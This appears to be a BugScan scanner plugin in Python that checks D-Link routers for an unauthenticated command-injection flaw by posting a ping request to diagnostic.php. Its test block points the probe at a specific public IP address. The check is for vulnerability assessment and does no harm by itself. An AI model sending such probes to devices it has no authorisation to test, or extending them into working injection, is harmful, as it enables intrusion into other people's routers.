#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer https://www.bugscan.net/#!/x/2982

import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
		
def audit(arg): 
    url = 'diagnostic.php'
    payload = 'act=ping&dst=www.baidu.com'
    code, head, res, errcode, _ = curl.curl2(arg+url,payload)
    if code == 200 and '<report>OK' in res:
        security_hole('dlink unauthenticated command injection '+arg+url)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('www', 'http://83.233.183.198:8080/')[1])